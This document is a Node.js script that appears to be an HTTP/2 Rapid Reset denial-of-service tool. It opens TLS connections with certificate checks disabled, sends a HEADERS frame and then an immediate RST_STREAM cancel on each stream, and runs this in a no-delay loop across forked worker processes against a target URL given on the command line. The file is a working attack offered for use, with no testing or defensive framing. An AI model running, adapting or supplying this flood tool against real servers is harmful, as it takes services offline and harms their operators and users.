
const tls = require('tls');
const url = require('url');
const fs = require('fs');
const net = require('net');
const http = require('http');
const cluster = require("cluster");
const HPACK = require('hpack');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (exception) { console.log(exception) });

const HTTP2_FRAME_SIZE = 9;
const FRAME_TYPE_SETTINGS = 0x4;
const FRAME_TYPE_HEADERS = 0x1;
const FRAME_TYPE_RST_STREAM = 0x3;
const FLAGS_NONE = 0x0;
const FLAGS_END_STREAM = 0x1;
const FLAGS_END_HEADERS = 0x4;
const STREAM_ID_ZERO = 0x0;
const STREAM_ID = 1;
const RST_STREAM_CANCEL = 0x8;
const FRAME_TYPE_WINDOW_UPDATE = 0x8;

const SETTINGS_HEADER_TABLE_SIZE = 0x1;
const SETTINGS_MAX_CONCURRENT_STREAMS = 0x3;
const SETTINGS_INITIAL_WINDOW_SIZE = 0x4;
const SETTINGS_MAX_HEADER_LIST_SIZE = 0x6;

function parseCommandLineArgs(args) {
    const parsedArgs = {};
    let currentFlag = null;

    for (const arg of args) {
        if (arg.startsWith('-')) {
            currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (currentFlag) {
            parsedArgs[currentFlag] = arg;
            currentFlag = null;
        }
    }

    return parsedArgs;
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}


const _argv = process.argv.slice(2);
const argz = parseCommandLineArgs(_argv);

const url1 = process.argv[2];
const time = parseInt(process.argv[3]);
const rate = parseInt(process.argv[5]);
const thread = parseInt(process.argv[4]);
const proxy = process.argv[6];

const rst = argz['rst'];

var proxies = readLines(proxy);
const parsed = url.parse(url1)

const codec = new HPACK();

function logFrameBytes(frame, description) {
    const frameParts = [
        frame.slice(0, 3).toString('hex').padEnd(8),
        frame.slice(3, 4).toString('hex').padEnd(4),
        frame.slice(4, 5).toString('hex').padEnd(4),
        frame.slice(5, 9).toString('hex').padEnd(11),
        frame.slice(9).toString('hex')
    ];
    console.log(`${description}\n${frameParts.join(' ')}\n`);
}

function createWindowUpdateFrame(streamId, windowSize) {
    const length = Buffer.alloc(3);
    length.writeUIntBE(4, 0, 3);
    const type = Buffer.alloc(1, FRAME_TYPE_WINDOW_UPDATE);
    const flags = Buffer.alloc(1, FLAGS_NONE);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);
    const windowSizeBuffer = Buffer.alloc(4);
    windowSizeBuffer.writeUInt32BE(windowSize, 0);

    return Buffer.concat([length, type, flags, streamIdBuffer, windowSizeBuffer]);
}

function createSettingsEntry(identifier, value) {
    const entryBuffer = Buffer.alloc(6);
    entryBuffer.writeUInt16BE(identifier, 0);
    entryBuffer.writeUInt32BE(value, 2);
    return entryBuffer;
}

function createSettingsFrame() {
    const settings = [
        createSettingsEntry(SETTINGS_HEADER_TABLE_SIZE, 65536),
        createSettingsEntry(SETTINGS_MAX_CONCURRENT_STREAMS, 100),
        createSettingsEntry(SETTINGS_INITIAL_WINDOW_SIZE, 6291456),
        createSettingsEntry(SETTINGS_MAX_HEADER_LIST_SIZE, 262144),
    ];

    const settingsPayload = Buffer.concat(settings);

    const length = Buffer.alloc(3);
    length.writeUIntBE(settingsPayload.length, 0, 3);

    const type = Buffer.alloc(1, FRAME_TYPE_SETTINGS);
    const flags = Buffer.alloc(1, FLAGS_NONE);
    const streamId = Buffer.alloc(4);
    streamId.writeUInt32BE(STREAM_ID_ZERO);

    const frame = Buffer.concat([length, type, flags, streamId, settingsPayload]);

    return frame;
}

function createHeadersFrame(streamId, headers) {
    const packedHeaders = codec.encode(headers);
    const length = packedHeaders.length;
    const type = FRAME_TYPE_HEADERS;
    const flags = FLAGS_NONE | FLAGS_END_HEADERS; 
    const header = Buffer.alloc(HTTP2_FRAME_SIZE);

    header.writeUInt32BE((length << 8) | type, 0);
    header.writeUInt8(flags, 4);
    header.writeUInt32BE(streamId, 5);

    logFrame(header, 'HEADERS', streamId);

    return Buffer.concat([header, packedHeaders]);
}

// Функция для создания RST_STREAM фрейма
function createRST_STREAM(streamId, errorCode) {
    const length = Buffer.alloc(3);
    length.writeUIntBE(4, 0, 3);
    const type = Buffer.alloc(1, 0x03);
    const flags = Buffer.alloc(1, 0);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);
    const errorCodeBuffer = Buffer.alloc(4);
    errorCodeBuffer.writeUInt32BE(errorCode, 0);

    return Buffer.concat([length, type, flags, streamIdBuffer, errorCodeBuffer]);
}



function logFrame(frameBuffer, type, streamId) {
    const length = frameBuffer.length - HTTP2_FRAME_SIZE;
    const flags = getFlags(type, frameBuffer); 

    console.log(`[frame] ${type} > ${flags} stream: ${streamId} [${length}]`);
}

function getFlags(type, frameBuffer) {
    let flags = frameBuffer[4];
    let flagsStr = '';

    switch (type) {
        case 'HEADERS':
            if (flags & FLAGS_END_HEADERS) flagsStr += 'END_HEADERS ';
            if (flags & FLAGS_END_STREAM) flagsStr += 'END_STREAM ';
            break;
        case 'RST_STREAM':
            flagsStr = 'END_STREAM';
            break;
        case 'SETTINGS':
            flagsStr = 'NONE';
            break;
    }

    return flagsStr.trim();
}

let STREAM_ID_DYNAMIC = 1;

function sendHttpRequest(host, port, path) {
    const client = tls.connect(port, host, {
        host: host,
        ALPNProtocols: ['h2'],
        rejectUnauthorized: false,
    }, () => {
        client.write('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n');

        client.write(createSettingsFrame());

        const windowUpdateFrame = createWindowUpdateFrame(STREAM_ID_ZERO, 15663105);
        client.write(windowUpdateFrame);
        //logFrameBytes(windowUpdateFrame, 'WINDOW_UPDATE Frame');

        STREAM_ID_DYNAMIC += 2;

        const headersFrame = createHeadersFrame(STREAM_ID_DYNAMIC, [
            [':method', 'GET'],
            [':scheme', 'https'],
            [':path', path],
            [':authority', host],
            ['user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36']
        ]);


        client.write(headersFrame);
        //logFrameBytes(headersFrame, 'HEADERS Frame');

        const rstStreamFrame = createRST_STREAM(STREAM_ID_DYNAMIC, 0x8);
        client.write(rstStreamFrame);
    });

    client.on('data', (data) => {
        console.log(data.toString());
    });

    client.on('error', (err) => {
    });
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= thread; counter++) {
        cluster.fork();
    }
} else {
    setInterval(() => { sendHttpRequest(parsed.host, 443, parsed.path); });
}